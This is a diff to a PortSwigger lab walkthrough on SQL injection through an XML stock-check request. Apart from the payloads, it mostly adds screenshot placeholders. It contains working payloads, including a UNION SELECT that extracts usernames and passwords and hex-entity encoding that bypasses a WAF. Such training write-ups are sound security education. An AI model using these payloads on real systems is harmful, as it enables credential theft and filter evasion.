@@ -30,11 +30,19 @@ The stock-check feature sends the `productId` and `storeId` to `POST /product/st
 </stockCheck>
 ```
 
+> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `<?xml version="1.0" encoding="UTF-8"?>`.
+> _Save as_ `images/portswigger-sqli-part-5-filter-bypass-xml-encoding/2.png` _then replace this block with_ `![Step 1 — Identify the injection point](/images/portswigger-sqli-part-5-filter-bypass-xml-encoding/2.png)`_._
+
+
 Send this request to Burp Repeater and confirm the `storeId` is evaluated as a number by using an arithmetic expression:
 
 ```xml
 <storeId>1+1</storeId>
 ```
+
+> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `<storeId>1+1</storeId>`.
+> _Save as_ `images/portswigger-sqli-part-5-filter-bypass-xml-encoding/3.png` _then replace this block with_ `![Step 1 — Identify the injection point](/images/portswigger-sqli-part-5-filter-bypass-xml-encoding/3.png)`_._
+
 
 If the response returns the stock for a different store, the value is being evaluated server-side — a strong hint that it reaches the SQL query.
 
@@ -45,6 +53,10 @@ Try a straightforward `UNION` to discover the column count:
 ```xml
 <storeId>1 UNION SELECT NULL</storeId>
 ```
+
+> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `<storeId>1 UNION SELECT NULL</storeId>`.
+> _Save as_ `images/portswigger-sqli-part-5-filter-bypass-xml-encoding/4.png` _then replace this block with_ `![Step 2 — Hit the WAF](/images/portswigger-sqli-part-5-filter-bypass-xml-encoding/4.png)`_._
+
 
 The request is now blocked as a suspected attack. That confirms a signature-based filter is looking for SQL keywords in the request body.
 
@@ -63,6 +75,10 @@ Hackvertor wraps the value like this:
 <storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
 ```
 
+> **Picture goes here (#5).** Capture this request/response or command step in Burp/terminal. Key line: `<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>`.
+> _Save as_ `images/portswigger-sqli-part-5-filter-bypass-xml-encoding/5.png` _then replace this block with_ `![Step 3 — Bypass with XML entities](/images/portswigger-sqli-part-5-filter-bypass-xml-encoding/5.png)`_._
+
+
 Resend. The response is now normal, which shows the WAF was bypassed.
 
 ### Step 4 — Build the exploit
@@ -73,10 +89,14 @@ The query only returns a single column (adding a second column makes the applica
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
 ```
 
+> **Picture goes here (#6).** Capture this request/response or command step in Burp/terminal. Key line: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entiti`.
+> _Save as_ `images/portswigger-sqli-part-5-filter-bypass-xml-encoding/6.png` _then replace this block with_ `![Step 4 — Build the exploit](/images/portswigger-sqli-part-5-filter-bypass-xml-encoding/6.png)`_._
+
+
 Send it and the response contains the usernames and passwords separated by `~`.
 
-> **Picture goes here (#2).** Repeater request with the `hex_entities` wrapper and the response containing `administrator~<password>`.
-> _Save as_ `images/portswigger-sqli-part-5-filter-bypass-xml-encoding/2.png` _then replace this block with_ `![Step 4 — Build the exploit](/images/portswigger-sqli-part-5-filter-bypass-xml-encoding/2.png)`_._
+> **Picture goes here (#7).** Repeater request with the `hex_entities` wrapper and the response containing `administrator~<password>`.
+> _Save as_ `images/portswigger-sqli-part-5-filter-bypass-xml-encoding/7.png` _then replace this block with_ `![Step 4 — Build the exploit](/images/portswigger-sqli-part-5-filter-bypass-xml-encoding/7.png)`_._
 
 ### Step 5 — Log in
 
